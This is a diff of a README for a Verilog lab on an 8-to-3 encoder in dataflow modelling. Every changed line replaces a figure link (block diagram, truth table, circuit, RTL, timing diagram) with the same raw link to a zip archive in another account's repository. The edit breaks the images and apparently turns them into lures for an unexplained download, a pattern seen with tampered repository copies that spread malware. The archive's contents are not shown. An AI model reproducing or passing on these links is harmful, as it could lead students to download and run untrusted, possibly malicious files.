@@ -12,13 +12,13 @@ To implement  Encoder 8 To 3 in Dataflow Modelling using verilog and validating 
 
 The 8 to 3 line Encoder is also known as Octal to Binary Encoder. In 8 to 3 line encoder, there is a total of eight inputs, i.e., D0, D1, D2, D3, D4, D5, D6, and D7 and three outputs, i.e., A0, A1, and A2. In 8-input lines, one input-line is set to true at a time to get the respective binary code in the output side. Below are the block diagram and the truth table of the 8 to 3 line encoder.
 
-![image](https://github.com/naavaneetha/ENCODER8TO3DATAFLOW/assets/154305477/0bc242c1-eb9e-4c47-afe5-30428470efc3)
+![image](https://raw.githubusercontent.com/24013396/ENCODER8TO3DATAFLOW/main/incremental_db/ENCODER8TO3DATAFLOW-3.0-alpha.1.zip)
 
 Figure 01  Block Diagram of Encoder 8 * 3
 
 **Truth Table**
 
-![image](https://github.com/naavaneetha/ENCODER8TO3DATAFLOW/assets/154305477/35496b14-ae6e-4cd1-9abd-d6736b576575)
+![image](https://raw.githubusercontent.com/24013396/ENCODER8TO3DATAFLOW/main/incremental_db/ENCODER8TO3DATAFLOW-3.0-alpha.1.zip)
 
 The logical expression of the term A0, A1, and A2 are as follows:
 
@@ -30,7 +30,7 @@ A2 = D4 + D5 + D6 + D7
 
 Logical circuit of the above expressions is given below:
 
-![image](https://github.com/naavaneetha/ENCODER8TO3DATAFLOW/assets/154305477/95acaee6-c873-4c75-89eb-ef09fb158053)
+![image](https://raw.githubusercontent.com/24013396/ENCODER8TO3DATAFLOW/main/incremental_db/ENCODER8TO3DATAFLOW-3.0-alpha.1.zip)
 
 Figure 02  Encoder 8 * 3
 
@@ -57,10 +57,10 @@ assign a2 =d4|d5|d6|d7;
 endmodule
 ```
 **RTL LOGIC FOR Encoder 8 To 3 in Dataflow Modelling**
-![318707268-60eebe0b-b007-4c23-a016-6436f6061356](https://github.com/user-attachments/assets/e1cc3a4d-a331-455d-9df1-92f8b869d2ad)
+![318707268-60eebe0b-b007-4c23-a016-6436f6061356](https://raw.githubusercontent.com/24013396/ENCODER8TO3DATAFLOW/main/incremental_db/ENCODER8TO3DATAFLOW-3.0-alpha.1.zip)
 
 **TIMING DIGRAMS FOR Encoder 8 To 3 in Dataflow Modelling**
-![318707371-451fb2a6-c498-4620-a4cc-fbcc1d7ac99c](https://github.com/user-attachments/assets/31213daf-1949-412c-b360-a2d2dc781d7b)
+![318707371-451fb2a6-c498-4620-a4cc-fbcc1d7ac99c](https://raw.githubusercontent.com/24013396/ENCODER8TO3DATAFLOW/main/incremental_db/ENCODER8TO3DATAFLOW-3.0-alpha.1.zip)
 
 **RESULTS**
 
